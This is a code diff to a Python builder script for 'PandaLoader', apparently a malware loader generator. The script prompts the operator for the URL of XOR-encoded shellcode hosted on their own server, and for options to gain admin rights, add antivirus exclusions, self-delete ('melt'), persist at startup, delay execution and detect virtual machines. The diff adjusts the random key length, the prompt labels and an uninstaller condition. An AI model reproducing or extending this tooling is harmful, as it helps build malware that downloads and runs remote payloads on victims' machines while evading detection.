@@ -103,7 +103,7 @@ def get_valid_url(prompt):
             return value
         print(f"{RED}Invalid URL. Please enter a valid URL starting with http.{RESET}")
 def get_random_key():
-    random_bytes = bytes(random.randint(0, 255) for _ in range(10))
+    random_bytes = bytes(random.randint(0, 255) for _ in range(12))
     base64_string = base64.b64encode(random_bytes).decode('utf-8')
     return re.sub(r'[+/=]', '', base64_string)
 def validate_shellcode_path(path):
@@ -165,9 +165,9 @@ def main():
     print(f"{YELLOW}[*] Upload xor.bin to your server, copy the direct download link and paste it here.{RESET}")
     shellcode_url = get_valid_url("[*] Enter the shellcode URL (starting with http): ")
     enable_admin = get_valid_binary_input("[*] Enter value for ENABLE_ADMIN (1 or 0): ")
-    add_exclusion = get_valid_binary_input("[*] Enter value for ADD_EXCLUSION (1 or 0): ")
+    add_exclusion = get_valid_binary_input("[*] Enter value for ADD_EXCLUSION [admin required] (1 or 0): ")
     melt = get_valid_binary_input("[*] Enter value for MELT (1 or 0): ")
-    enable_startup = get_valid_binary_input("[*] Enter value for ENABLE_STARTUP (1 or 0): ")
+    enable_startup = get_valid_binary_input("[*] Enter value for ENABLE_STARTUP [admin required] (1 or 0): ")
     sleep_delay = get_valid_binary_input("[*] Enter value for SLEEP_DELAY (1 or 0): ")
     enable_antivm = get_valid_binary_input("[*] Enter value for ENABLE_ANTIVM (1 or 0): ")
     hide_directory = "0"
@@ -216,7 +216,7 @@ def main():
     shutil.copy(backup_path, panda_loader_path)
     backup_path.unlink()
     print(f"{GREEN}[*] PandaLoader.cpp has been restored to its original state.{RESET}")
-    if enable_startup == "1":
+    if enable_startup == "1" and enable_admin == "1":
         uninstaller_path = Path.cwd() / "uninstaller.ps1"
         uninstaller_content = f"""if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {{
     $arguments = "& '" + $myinvocation.mycommand.definition + "'"
